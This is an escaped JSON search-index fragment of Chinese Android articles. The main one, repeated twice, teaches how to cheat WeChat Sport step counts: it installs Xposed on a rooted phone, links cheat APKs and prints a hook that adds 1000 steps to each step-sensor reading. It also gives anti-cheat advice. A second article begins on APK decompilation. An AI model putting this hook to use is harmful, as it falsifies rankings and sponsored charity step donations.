\u9996\u5148\u6211\u4eec\u9700\u8981\u4e00\u53f0\u5e26\u534f\u5904\u7406\u7684root\u540e\u7684android\u673a\u5668,\u6bd4\u5982\u8bf4nexus 5\u3002\u7136\u540e\u6211\u4eec\u88c5\u4e0a\u4f5c\u5f0a\u7528\u7684XPosed Hook\u6846\u67b6\u548c\u4f5c\u5f0a\u63d2\u4ef6\u3002\u8fd9\u4e24\u4e2aapk\u53ef\u4ee5\u5728\u6211\u7684github\u4e0a\u4e0b\u8f7d\u5230\u3002 https://github.com/zhengmin1989/WechatSportCheat \u4e0b\u8f7d\u5b8c\u540e,\u5148\u5b89\u88c5XPosed.apk\u3002\u63a5\u7740\u6253\u5f00Xposed,\u9009\u62e9\u201c\u5b89\u88c5/\u66f4\u65b0\u201d,\u7136\u540e\u6839\u636e\u63d0\u793a\u91cd\u542f\u624b\u673a\u3002 \u91cd\u542f\u5b8c\u540e,\u518d\u5b89\u88c5xposedwechat.apk\u63d2\u4ef6\u3002\u7136\u540e\u6253\u5f00Xposed\u7684\u6a21\u5757\u754c\u9762,\u4f1a\u770b\u5230xposedwechat\u8fd9\u4e2a\u63d2\u4ef6\u3002\u6211\u4eec\u5728\u8fd9\u91cc\u5c06\u5b83\u9009\u4e2d,\u7136\u540e\u518d\u6839\u636e\u63d0\u793a\u91cd\u542f\u624b\u673a\u3002 \u63a5\u4e0b\u6765\u5c31\u662f\u89c1\u8bc1\u5947\u8ff9\u7684\u65f6\u523b\u2026\u4f60\u968f\u610f\u8d70\u4e24\u6b65,\u7136\u540e\u6253\u5f00\u5fae\u4fe1\u8fd0\u52a8,\u54a6,\u600e\u4e48\u5c31\u591a\u4e861000\u6b65?\u518d\u968f\u4fbf\u8d70\u51e0\u6b65,\u54a6,\u600e\u4e48\u53c8\u591a\u4e861000\u6b65?\u2026 demo\u89c6\u9891\u5982\u4e0b: \u4ec5\u4ec5\u5237\u6b65\u6570\u8fd8\u662f\u4e0d\u591f\u8fc7\u763e\u5427?\u5fae\u4fe1\u8fd0\u52a8\u8fd8\u63a8\u51fa\u4e86\u76ca\u884c\u5bb6\u6d3b\u52a8,\u53ef\u4ee5\u7528\u6bcf\u5929\u7684\u6b65\u6570\u6362\u53d6\u7231\u5fc3\u6350\u6b3e\u3002\u6709\u4e86\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a\u5927\u6cd5,\u6211\u4eec\u53ef\u4ee5\u6bcf\u5929\u5728\u5bb6\u968f\u4fbf\u8d70\u51e0\u6b65\u7136\u540e\u6362\u53d6\u7231\u5fc3\u6350\u6b3e(\u5982\u56fe\u6240\u793a)\u3002 0x02 \u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a\u539f\u7406 \u6211\u4eec\u662f\u5982\u4f55\u4f5c\u5f0a\u7684\u5462?\u7b80\u5355\u6765\u8bf4,\u5f53\u5fae\u4fe1\u8fd0\u52a8\u60f3\u8981\u77e5\u9053\u6211\u4eec\u8d70\u4e86\u591a\u5c11\u6b65\u7684\u65f6\u5019,\u5fae\u4fe1app\u4f1a\u8be2\u95eeandroid\u7cfb\u7edf\u7684\u8ba1\u6570\u4f20\u611f\u5668,\u968f\u540e\u8ba1\u6570\u4f20\u611f\u5668\u4f1a\u8fd4\u56de\u6211\u4eec\u884c\u8d70\u7684\u6b65\u6570\u3002\u56e0\u6b64,\u5982\u679c\u6211\u4eec\u80fd\u591f\u62e6\u622a\u5fae\u4fe1\u8fd0\u52a8\u548c\u8ba1\u6570\u4f20\u611f\u5668\u4e4b\u95f4\u7684\u5bf9\u8bdd,\u7136\u540e\u4f2a\u9020\u4e00\u4e2a\u6b65\u6570\u4f20\u9012\u7ed9\u5fae\u4fe1\u8fd0\u52a8\u5c31\u53ef\u4ee5\u8fbe\u5230\u6211\u4eec\u60f3\u8981\u7684\u4f5c\u5f0a\u6548\u679c\u3002 \u5177\u4f53\u600e\u4e48\u505a\u5462?\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u7528Xposed\u6846\u67b6\u6765hook\u8ba1\u6570\u4f20\u611f\u5668\u7684\u961f\u5217\u51fd\u6570dispatchSensorEvent(),\u8fd9\u4e2a\u51fd\u6570\u5728 android.hardware.SystemSensorManager$SensorEventQueue\u8fd9\u4e2a\u7c7b\u4e2d\u3002\u968f\u540e\u5728\u5fae\u4fe1\u8fd0\u52a8\u6bcf\u6b21\u8be2\u95ee\u884c\u8d70\u6b65\u6570\u7684\u65f6\u5019,\u6211\u4eec\u5148\u83b7\u53d6\u5f53\u524d\u6b65\u6570,\u7136\u540e\u5728\u76ee\u524d\u7684\u6b65\u6570\u7684\u57fa\u7840\u4e0a\u52a01000\u6b65,\u7136\u540e\u5c06\u4fe1\u606f\u8fd4\u56de\u7ed9\u5fae\u4fe1\u8fd0\u52a8\u3002\u5fae\u4fe1\u8fd0\u52a8\u5c31\u4f1a\u8bef\u4ee5\u4e3a\u6211\u4eec\u8fd0\u52a8\u4e861000\u6b65,\u4ece\u800c\u8fbe\u5230\u4e86\u6b3a\u9a97\u7684\u6548\u679c\u3002 \u5173\u952e\u4ee3\u7801\u5982\u4e0b: \u9996\u5148hook android.hardware.SystemSensorManager$SensorEventQueue\u8fd9\u4e2a\u7c7b\u7684dispatchSensorEvent()\u51fd\u6570: final Class<?> sensorEL = findClass(\"android.hardware.SystemSensorManager$SensorEventQueue\",lpparam.classLoader); XposedBridge.hookAllMethods(sensorEL, \"dispatchSensorEvent\", new XC_MethodHook() \u63a5\u7740\u6211\u4eec\u5728\u8bb0\u6b65\u4f20\u611f\u5668\u628a\u6b65\u6570\u4fe1\u606f\u8fd4\u56de\u7ed9\u5fae\u4fe1\u8fd0\u52a8\u4e4b\u524d,\u5c06\u8fd4\u56de\u7684\u6b65\u6570\u52a0\u4e0a1000\u6b65: protected void beforeHookedMethod(MethodHookParam param) throws Throwable { XposedBridge.log(\" mzheng Hooked method: \" + param.method); ((float[]) param.args[1])[0]=((float[]) param.args[1])[0]+1000*WechatStepCount; WechatStepCount+=1; \u2026 \u53e6\u5916\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u4f20\u611f\u5668\u7684\u63a5\u53e3\u83b7\u53d6\u4e00\u4e9b\u6570\u636e\u7684\u4fe1\u606f: Sensor ss = ((SparseArray<Sensor>) field.get(0)).get(handle); XposedBridge.log(\" SensorEvent: sensor=\" + ss); enter image description here \u6bd4\u5982\u8bf4x\u5c31\u4ee3\u8868\u5f00\u673a\u4ee5\u6765\u884c\u8d70\u7684\u6b65\u6570,timestamp\u662f\u83b7\u53d6\u6b65\u6570\u65f6\u5019\u7684\u65f6\u95f4\u6233\u7b49\u3002 \u53e6\u5916,\u6211\u4eec\u4e0d\u4ec5\u5728android\u4e0a\u53ef\u4ee5hook\u8ba1\u6b65\u5668,\u5728iOS\u4e0a\u4e5f\u662f\u53ef\u4ee5\u901a\u8fc7\u8d8a\u72f1\u540ehook iHealth\u7684API\u63a5\u53e3\u8fbe\u5230\u540c\u6837\u7684\u4f5c\u5f0a\u6548\u679c,\u6709\u5174\u8da3\u7684\u540c\u5b66\u53ef\u4ee5\u7ee7\u7eed\u7814\u7a76\u3002 0x03\u5fae\u4fe1\u8fd0\u52a8\u53cd\u4f5c\u5f0a\u5efa\u8bae \u5982\u4f55\u9632\u6b62\u8fd9\u79cd\u4f5c\u5f0a\u53d1\u751f\u5462?\u6211\u7684\u7b2c\u4e00\u4e2a\u5efa\u8bae\u662f\u52a0\u5f3a\u670d\u52a1\u5668\u7aef\u7684\u903b\u8f91\u68c0\u6d4b\u529f\u80fd\u3002\u6bd4\u5982\u8bf4\u4e00\u4e2a\u4eba\u662f\u4e0d\u53ef\u80fd\u5341\u5206\u949f\u5185\u8d70\u4e00\u4e07\u6b65\u7684,\u5982\u679c\u4ed6\u505a\u5230\u4e86,\u90a3\u4e48\u4ed6\u4e00\u5b9a\u662f\u5728\u4f5c\u5f0a\u3002 \u6211\u7684\u7b2c\u4e8c\u4e2a\u5efa\u8bae\u662f\u589e\u52a0\u5bf9hook\u7684\u68c0\u6d4b\u529f\u80fd\u3002\u867d\u7136\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u4e0b\u5f0a\u65e0\u975e\u5c31\u662f\u6ee1\u8db3\u4e00\u4e0b\u5927\u5bb6\u4e89\u5f3a\u597d\u80dc\u7684\u865a\u8363\u5fc3,\u5e76\u4e0d\u4f1a\u5bf9\u5927\u5bb6\u7684\u9690\u79c1\u548c\u8d22\u4ea7\u4ea7\u751f\u635f\u5931\u3002\u4f46\u662f\u65e2\u7136\u5fae\u4fe1\u8fd0\u52a8\u53ef\u4ee5\u88abhook,\u540c\u6837\u4e5f\u610f\u5473\u7740\u8bed\u97f3\u804a\u5929,\u5fae\u4fe1\u652f\u4ed8\u7b49\u529f\u80fd\u4e5f\u662f\u53ef\u4ee5\u88abhook\u7684,\u5f53\u9ed1\u5ba2\u5229\u7528hook\u6280\u672f\u5bf9\u4f60\u7684\u9690\u79c1\u548c\u8d22\u4ea7\u4ea7\u751f\u5371\u5bb3\u7684\u65f6\u5019\u53ef\u5c31\u4e0d\u662f\u90a3\u4e48\u597d\u73a9\u7684\u4e8b\u4e86\u3002\u4e4b\u524d\u6211\u4eec\u5728Hacking Team\u4e8b\u4ef6\u4e2d\u4e5f\u4eb2\u773c\u76ee\u7779\u4e86\u5229\u7528hook\u6280\u672f\u6765\u83b7\u53d6\u5fae\u4fe1\u8bed\u97f3\u6d88\u606f\u7684android\u6728\u9a6c,\u6240\u4ee5\u4e00\u5b9a\u8981\u589e\u52a0\u9488\u5bf9hook\u7684\u68c0\u6d4b\u624d\u884c\u3002 0x04 \u603b\u7ed3 \u6b64\u6587\u53ea\u662f\u4ecb\u7ecd\u4e86Android Hook\u7684\u7b80\u5355\u573a\u666f\u5e94\u7528,\u5173\u4e8eAndroid Hook\u7684\u539f\u7406\u4ee5\u53ca\u66f4\u591a\u7684\u5229\u7528\u65b9\u5f0f,\u6bd4\u5982\u8bf4\u8c03\u8bd5,\u5173\u952eAPI\u62e6\u622a,\u5916\u6302\u7b49\u6280\u5de7,\u656c\u8bf7\u671f\u5f85WooYun Book\u7cfb\u5217\u7684\u6587\u7ae0\u300a\u5b89\u5353\u52a8\u6001\u8c03\u8bd5\u4e03\u79cd\u6b66\u5668\u4e4b\u79bb\u522b\u94a9 \u2013 Hooking\u300b\u3002 https://github.com/zhengmin1989/TheSevenWeapons 0x05 \u53c2\u8003\u6587\u7ae0 Android.Hook\u6846\u67b6xposed\u7bc7(Http\u6d41\u91cf\u76d1\u63a7) \u4eba\u624b\u4e00\u4efd\u6838\u6b66\u5668 \u2013 Hacking Team \u6cc4\u9732(\u5f00\u6e90)\u8d44\u6599\u5bfc\u89c8\u624b\u518c \u539f\u6587\u94fe\u63a5\uff1a https://www.anquanke.com/post/id/82323","title":"\u624b\u628a\u624b\u6559\u4f60\u5f53\u5fae\u4fe1\u8fd0\u52a8\u7b2c\u4e00\u540d\u2013\u5229\u7528AndroidHook\u8fdb\u884c\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a"},{"location":"Android/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E5%BD%93%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E7%AC%AC%E4%B8%80%E5%90%8D%E2%80%93%E5%88%A9%E7%94%A8AndroidHook%E8%BF%9B%E8%A1%8C%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E4%BD%9C%E5%BC%8A/#android-hook","text":"0x00 \u5e8f \u968f\u7740\u5e26\u534f\u5904\u7406\u5668\u548c\u4e70\u624b\u73af\u7684\u4eba\u8d8a\u6765\u8d8a\u591a,\u5fae\u4fe1\u8fd0\u52a8\u4e00\u4e0b\u5b50\u706b\u4e86,\u53ea\u8981\u4f60\u5728\u5fae\u4fe1\u5173\u6ce8\u5fae\u4fe1\u8fd0\u52a8,\u624b\u673a\u5c31\u80fd\u81ea\u52a8\u8bb0\u5f55\u4f60\u6bcf\u5929\u884c\u8d70\u7684\u6b65\u6570,\u8fd8\u53ef\u4ee5\u8ddf\u670b\u53cb\u5708\u91cc\u7684\u597d\u53cbPK\u8fd0\u52a8\u91cf\u3002\u5e76\u4e14\u6bcf\u65e5\u6392\u540d\u7b2c\u4e00\u7684\u7528\u6237\u53ef\u4ee5\u5360\u636e\u5f53\u65e5\u6392\u884c\u699c\u7684\u5c01\u9762\u3002\u8fd9\u5145\u5206\u6fc0\u8d77\u4e86\u5927\u5bb6\u7684\u6c42\u80dc\u7684\u6b32\u671b,\u4e8e\u662f\u51fa\u73b0\u4e86\u5f88\u591a\u52b1\u5fd7\u7684\u548c\u60b2\u4f24\u7684\u6545\u4e8b\u2026\u2026 0x01\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a\u5927\u6cd5 \u5176\u5b9e\u60f3\u8981\u62ff\u7b2c\u4e00\u6ca1\u6709\u90a3\u4e48\u9ebb\u70e6,\u53ea\u8981\u4f1a\u4e00\u70b9Android\u7684Hook\u77e5\u8bc6,\u5c31\u53ef\u4ee5\u8f7b\u677e\u51b2\u5230\u6392\u884c\u699c\u7b2c\u4e00\u540d\u3002\u63a5\u4e0b\u6765\u6211\u5c31\u624b\u628a\u624b\u6559\u4f60\u5982\u4f55\u53d8\u6210\u7b2c\u4e00\u3002 \u9996\u5148\u6211\u4eec\u9700\u8981\u4e00\u53f0\u5e26\u534f\u5904\u7406\u7684root\u540e\u7684android\u673a\u5668,\u6bd4\u5982\u8bf4nexus 5\u3002\u7136\u540e\u6211\u4eec\u88c5\u4e0a\u4f5c\u5f0a\u7528\u7684XPosed Hook\u6846\u67b6\u548c\u4f5c\u5f0a\u63d2\u4ef6\u3002\u8fd9\u4e24\u4e2aapk\u53ef\u4ee5\u5728\u6211\u7684github\u4e0a\u4e0b\u8f7d\u5230\u3002 https://github.com/zhengmin1989/WechatSportCheat \u4e0b\u8f7d\u5b8c\u540e,\u5148\u5b89\u88c5XPosed.apk\u3002\u63a5\u7740\u6253\u5f00Xposed,\u9009\u62e9\u201c\u5b89\u88c5/\u66f4\u65b0\u201d,\u7136\u540e\u6839\u636e\u63d0\u793a\u91cd\u542f\u624b\u673a\u3002 \u91cd\u542f\u5b8c\u540e,\u518d\u5b89\u88c5xposedwechat.apk\u63d2\u4ef6\u3002\u7136\u540e\u6253\u5f00Xposed\u7684\u6a21\u5757\u754c\u9762,\u4f1a\u770b\u5230xposedwechat\u8fd9\u4e2a\u63d2\u4ef6\u3002\u6211\u4eec\u5728\u8fd9\u91cc\u5c06\u5b83\u9009\u4e2d,\u7136\u540e\u518d\u6839\u636e\u63d0\u793a\u91cd\u542f\u624b\u673a\u3002 \u63a5\u4e0b\u6765\u5c31\u662f\u89c1\u8bc1\u5947\u8ff9\u7684\u65f6\u523b\u2026\u4f60\u968f\u610f\u8d70\u4e24\u6b65,\u7136\u540e\u6253\u5f00\u5fae\u4fe1\u8fd0\u52a8,\u54a6,\u600e\u4e48\u5c31\u591a\u4e861000\u6b65?\u518d\u968f\u4fbf\u8d70\u51e0\u6b65,\u54a6,\u600e\u4e48\u53c8\u591a\u4e861000\u6b65?\u2026 demo\u89c6\u9891\u5982\u4e0b: \u4ec5\u4ec5\u5237\u6b65\u6570\u8fd8\u662f\u4e0d\u591f\u8fc7\u763e\u5427?\u5fae\u4fe1\u8fd0\u52a8\u8fd8\u63a8\u51fa\u4e86\u76ca\u884c\u5bb6\u6d3b\u52a8,\u53ef\u4ee5\u7528\u6bcf\u5929\u7684\u6b65\u6570\u6362\u53d6\u7231\u5fc3\u6350\u6b3e\u3002\u6709\u4e86\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a\u5927\u6cd5,\u6211\u4eec\u53ef\u4ee5\u6bcf\u5929\u5728\u5bb6\u968f\u4fbf\u8d70\u51e0\u6b65\u7136\u540e\u6362\u53d6\u7231\u5fc3\u6350\u6b3e(\u5982\u56fe\u6240\u793a)\u3002 0x02 \u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a\u539f\u7406 \u6211\u4eec\u662f\u5982\u4f55\u4f5c\u5f0a\u7684\u5462?\u7b80\u5355\u6765\u8bf4,\u5f53\u5fae\u4fe1\u8fd0\u52a8\u60f3\u8981\u77e5\u9053\u6211\u4eec\u8d70\u4e86\u591a\u5c11\u6b65\u7684\u65f6\u5019,\u5fae\u4fe1app\u4f1a\u8be2\u95eeandroid\u7cfb\u7edf\u7684\u8ba1\u6570\u4f20\u611f\u5668,\u968f\u540e\u8ba1\u6570\u4f20\u611f\u5668\u4f1a\u8fd4\u56de\u6211\u4eec\u884c\u8d70\u7684\u6b65\u6570\u3002\u56e0\u6b64,\u5982\u679c\u6211\u4eec\u80fd\u591f\u62e6\u622a\u5fae\u4fe1\u8fd0\u52a8\u548c\u8ba1\u6570\u4f20\u611f\u5668\u4e4b\u95f4\u7684\u5bf9\u8bdd,\u7136\u540e\u4f2a\u9020\u4e00\u4e2a\u6b65\u6570\u4f20\u9012\u7ed9\u5fae\u4fe1\u8fd0\u52a8\u5c31\u53ef\u4ee5\u8fbe\u5230\u6211\u4eec\u60f3\u8981\u7684\u4f5c\u5f0a\u6548\u679c\u3002 \u5177\u4f53\u600e\u4e48\u505a\u5462?\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u7528Xposed\u6846\u67b6\u6765hook\u8ba1\u6570\u4f20\u611f\u5668\u7684\u961f\u5217\u51fd\u6570dispatchSensorEvent(),\u8fd9\u4e2a\u51fd\u6570\u5728 android.hardware.SystemSensorManager$SensorEventQueue\u8fd9\u4e2a\u7c7b\u4e2d\u3002\u968f\u540e\u5728\u5fae\u4fe1\u8fd0\u52a8\u6bcf\u6b21\u8be2\u95ee\u884c\u8d70\u6b65\u6570\u7684\u65f6\u5019,\u6211\u4eec\u5148\u83b7\u53d6\u5f53\u524d\u6b65\u6570,\u7136\u540e\u5728\u76ee\u524d\u7684\u6b65\u6570\u7684\u57fa\u7840\u4e0a\u52a01000\u6b65,\u7136\u540e\u5c06\u4fe1\u606f\u8fd4\u56de\u7ed9\u5fae\u4fe1\u8fd0\u52a8\u3002\u5fae\u4fe1\u8fd0\u52a8\u5c31\u4f1a\u8bef\u4ee5\u4e3a\u6211\u4eec\u8fd0\u52a8\u4e861000\u6b65,\u4ece\u800c\u8fbe\u5230\u4e86\u6b3a\u9a97\u7684\u6548\u679c\u3002 \u5173\u952e\u4ee3\u7801\u5982\u4e0b: \u9996\u5148hook android.hardware.SystemSensorManager$SensorEventQueue\u8fd9\u4e2a\u7c7b\u7684dispatchSensorEvent()\u51fd\u6570: final Class<?> sensorEL = findClass(\"android.hardware.SystemSensorManager$SensorEventQueue\",lpparam.classLoader); XposedBridge.hookAllMethods(sensorEL, \"dispatchSensorEvent\", new XC_MethodHook() \u63a5\u7740\u6211\u4eec\u5728\u8bb0\u6b65\u4f20\u611f\u5668\u628a\u6b65\u6570\u4fe1\u606f\u8fd4\u56de\u7ed9\u5fae\u4fe1\u8fd0\u52a8\u4e4b\u524d,\u5c06\u8fd4\u56de\u7684\u6b65\u6570\u52a0\u4e0a1000\u6b65: protected void beforeHookedMethod(MethodHookParam param) throws Throwable { XposedBridge.log(\" mzheng Hooked method: \" + param.method); ((float[]) param.args[1])[0]=((float[]) param.args[1])[0]+1000*WechatStepCount; WechatStepCount+=1; \u2026 \u53e6\u5916\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u4f20\u611f\u5668\u7684\u63a5\u53e3\u83b7\u53d6\u4e00\u4e9b\u6570\u636e\u7684\u4fe1\u606f: Sensor ss = ((SparseArray<Sensor>) field.get(0)).get(handle); XposedBridge.log(\" SensorEvent: sensor=\" + ss); enter image description here \u6bd4\u5982\u8bf4x\u5c31\u4ee3\u8868\u5f00\u673a\u4ee5\u6765\u884c\u8d70\u7684\u6b65\u6570,timestamp\u662f\u83b7\u53d6\u6b65\u6570\u65f6\u5019\u7684\u65f6\u95f4\u6233\u7b49\u3002 \u53e6\u5916,\u6211\u4eec\u4e0d\u4ec5\u5728android\u4e0a\u53ef\u4ee5hook\u8ba1\u6b65\u5668,\u5728iOS\u4e0a\u4e5f\u662f\u53ef\u4ee5\u901a\u8fc7\u8d8a\u72f1\u540ehook iHealth\u7684API\u63a5\u53e3\u8fbe\u5230\u540c\u6837\u7684\u4f5c\u5f0a\u6548\u679c,\u6709\u5174\u8da3\u7684\u540c\u5b66\u53ef\u4ee5\u7ee7\u7eed\u7814\u7a76\u3002 0x03\u5fae\u4fe1\u8fd0\u52a8\u53cd\u4f5c\u5f0a\u5efa\u8bae \u5982\u4f55\u9632\u6b62\u8fd9\u79cd\u4f5c\u5f0a\u53d1\u751f\u5462?\u6211\u7684\u7b2c\u4e00\u4e2a\u5efa\u8bae\u662f\u52a0\u5f3a\u670d\u52a1\u5668\u7aef\u7684\u903b\u8f91\u68c0\u6d4b\u529f\u80fd\u3002\u6bd4\u5982\u8bf4\u4e00\u4e2a\u4eba\u662f\u4e0d\u53ef\u80fd\u5341\u5206\u949f\u5185\u8d70\u4e00\u4e07\u6b65\u7684,\u5982\u679c\u4ed6\u505a\u5230\u4e86,\u90a3\u4e48\u4ed6\u4e00\u5b9a\u662f\u5728\u4f5c\u5f0a\u3002 \u6211\u7684\u7b2c\u4e8c\u4e2a\u5efa\u8bae\u662f\u589e\u52a0\u5bf9hook\u7684\u68c0\u6d4b\u529f\u80fd\u3002\u867d\u7136\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u4e0b\u5f0a\u65e0\u975e\u5c31\u662f\u6ee1\u8db3\u4e00\u4e0b\u5927\u5bb6\u4e89\u5f3a\u597d\u80dc\u7684\u865a\u8363\u5fc3,\u5e76\u4e0d\u4f1a\u5bf9\u5927\u5bb6\u7684\u9690\u79c1\u548c\u8d22\u4ea7\u4ea7\u751f\u635f\u5931\u3002\u4f46\u662f\u65e2\u7136\u5fae\u4fe1\u8fd0\u52a8\u53ef\u4ee5\u88abhook,\u540c\u6837\u4e5f\u610f\u5473\u7740\u8bed\u97f3\u804a\u5929,\u5fae\u4fe1\u652f\u4ed8\u7b49\u529f\u80fd\u4e5f\u662f\u53ef\u4ee5\u88abhook\u7684,\u5f53\u9ed1\u5ba2\u5229\u7528hook\u6280\u672f\u5bf9\u4f60\u7684\u9690\u79c1\u548c\u8d22\u4ea7\u4ea7\u751f\u5371\u5bb3\u7684\u65f6\u5019\u53ef\u5c31\u4e0d\u662f\u90a3\u4e48\u597d\u73a9\u7684\u4e8b\u4e86\u3002\u4e4b\u524d\u6211\u4eec\u5728Hacking Team\u4e8b\u4ef6\u4e2d\u4e5f\u4eb2\u773c\u76ee\u7779\u4e86\u5229\u7528hook\u6280\u672f\u6765\u83b7\u53d6\u5fae\u4fe1\u8bed\u97f3\u6d88\u606f\u7684android\u6728\u9a6c,\u6240\u4ee5\u4e00\u5b9a\u8981\u589e\u52a0\u9488\u5bf9hook\u7684\u68c0\u6d4b\u624d\u884c\u3002 0x04 \u603b\u7ed3 \u6b64\u6587\u53ea\u662f\u4ecb\u7ecd\u4e86Android Hook\u7684\u7b80\u5355\u573a\u666f\u5e94\u7528,\u5173\u4e8eAndroid Hook\u7684\u539f\u7406\u4ee5\u53ca\u66f4\u591a\u7684\u5229\u7528\u65b9\u5f0f,\u6bd4\u5982\u8bf4\u8c03\u8bd5,\u5173\u952eAPI\u62e6\u622a,\u5916\u6302\u7b49\u6280\u5de7,\u656c\u8bf7\u671f\u5f85WooYun Book\u7cfb\u5217\u7684\u6587\u7ae0\u300a\u5b89\u5353\u52a8\u6001\u8c03\u8bd5\u4e03\u79cd\u6b66\u5668\u4e4b\u79bb\u522b\u94a9 \u2013 Hooking\u300b\u3002 https://github.com/zhengmin1989/TheSevenWeapons 0x05 \u53c2\u8003\u6587\u7ae0 Android.Hook\u6846\u67b6xposed\u7bc7(Http\u6d41\u91cf\u76d1\u63a7) \u4eba\u624b\u4e00\u4efd\u6838\u6b66\u5668 \u2013 Hacking Team \u6cc4\u9732(\u5f00\u6e90)\u8d44\u6599\u5bfc\u89c8\u624b\u518c \u539f\u6587\u94fe\u63a5\uff1a https://www.anquanke.com/post/id/82323","title":"\u624b\u628a\u624b\u6559\u4f60\u5f53\u5fae\u4fe1\u8fd0\u52a8\u7b2c\u4e00\u540d \u2013 \u5229\u7528Android Hook\u8fdb\u884c\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a"},{"location":"Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/","text":"\u65e5\u79ef\u6708\u7d2f\uff1aProguard\u8fdb\u884c\u6e90\u4ee3\u7801\u6df7\u6dc6\u548c\u5d29\u6e83\u65e5\u5fd7\u53cd\u6df7\u6dc6 \u5728\u5b9e\u9645\u7684\u5f00\u53d1\u6210\u4ea7\u54c1apk\u7684\u53d1\u5e03\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u4f7f\u7528\u5230\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002\u4e0d\u8fc7\u5728\u8bb2\u89e3\u5982\u4f55\u8fdb\u884c\u4ee3\u7801\u6df7\u6dc6\u4e4b\u524d\uff0c\u6211\u5148\u8ddf\u5927\u5bb6\u6f14\u793a\u4e00\u4e0b\u53cd\u7f16\u8bd1\u7684\u8fc7\u7a0b\uff0c\u8fd9\u6837\u624d\u80fd\u8ba9\u5927\u5bb6\u660e\u767d\u4e3a\u4ec0\u4e48\u9700\u8981\u8fdb\u884c\u4ee3\u7801\u6df7\u6dc6\u3002 \u4e00\u3001\u4ee3\u7801\u53cd\u7f16\u8bd1 1.\u51c6\u5907\u5de5\u4f5c \u9996\u5148\u6211\u4eec\u51c6\u5907\u597d\u4e00\u4e2a\u9879\u76ee\u7684apk\u6587\u4ef6\uff08\u672a\u8fdb\u884c\u6df7\u6dc6\u6253\u5305\uff09\u3001dex2jar\u5de5\u5177\uff08\u4e0b\u8f7d\u5730\u5740\uff1a http://code.google.com/p/dex2jar/ \uff09\u3001jd-gui\u5de5\u5177\uff08\u4e0b\u8f7d\u5730\u5740\uff1a http://jd-gui.softpedia.com/ \uff09\u3002 2.\u83b7\u53d6CodeMixTest.apk\u4e2d\u7684classes.dex\u6587\u4ef6 \u5c06CodeMixTest.apk\u89e3\u538b\uff0c\u8fd9\u91cc\u6211\u4eec\u4e3a\u4e86\u65b9\u4fbf\u5c31\u76f4\u63a5\u89e3\u538b\u5230\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u3002\u5728\u89e3\u538b\u51fa\u7684\u6587\u4ef6\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u89c1\u6709\u4e00\u4e2aclasses.dex\u6587\u4ef6\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u7684\u6e90\u4ee3\u7801\u6253\u5305\u751f\u6210\u7684\u6587\u4ef6\u3002 3.\u4f7f\u7528dex2jar\u5de5\u5177\u8fd8\u539fjar\u6587\u4ef6 dex2jar\u5de5\u5177\u7684\u4f5c\u7528\u5c31\u662f\u5c06class.dex\u6587\u4ef6\u8fd8\u539f\u6210.jar\u6587\u4ef6\u3002\u5148\u5c06dex2jar-0.0.9.15.zip\u89e3\u538b\uff0c\u7136\u540e\u5c06\u4e0a\u9762\u83b7\u5f97\u7684classes.dex\u6587\u4ef6\u62f7\u8d1d\u81f3\u89e3\u538b\u7684\u76ee\u5f55\u4e2d\u3002 \u67e5\u770b\u89e3\u538b\u76ee\u5f55\u4e2d\uff0c\u6709dex2jar.bat\u6587\u4ef6\u3002 \u542f\u52a8cmd\uff0c\u8fdb\u5165\u5230dex2jar\u5de5\u5177\u89e3\u538b\u7684\u76ee\u5f55\u4e2d\uff0c\u8fd0\u884c\u547d\u4ee4\uff1adex2jar.bat classes.dex\uff0c\u6709\u5982\u4e0b\u7ed3\u679c\u3002 \u67e5\u770bdex2jar\u5de5\u5177\u89e3\u538b\u7684\u76ee\u5f55\u4e2d\uff0c\u751f\u6210\u4e86\u6211\u4eec\u60f3\u8981\u5f97\u5230\u7684classes_dex2jar.jar\u6587\u4ef6\u3002 4.\u4f7f\u7528jd-gui\u5de5\u5177\u67e5\u770bjar\u6587\u4ef6 \u5c06jd-gui-0.3.5.windows.zip\u5de5\u5177\u89e3\u538b\uff0c\u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\u76f4\u63a5\u89e3\u538b\u5230\u5f53\u524d\u6587\u4ef6\u5939\uff0c\u6211\u4eec\u4f1a\u770b\u89c1\u4e00\u4e2ajd-gui.exe\u6587\u4ef6\u3002 \u53cc\u51fbjd-gui.exe\uff0c\u4f7f\u7528\u5de5\u5177\u6253\u5f00\u524d\u9762\u6211\u4eec\u83b7\u5f97\u7684classes_dex2jar.jar\u6587\u4ef6\u3002\u53ef\u4ee5\u6e05\u695a\u7684\u770b\u89c1\u6e90\u4ee3\u7801\u3002 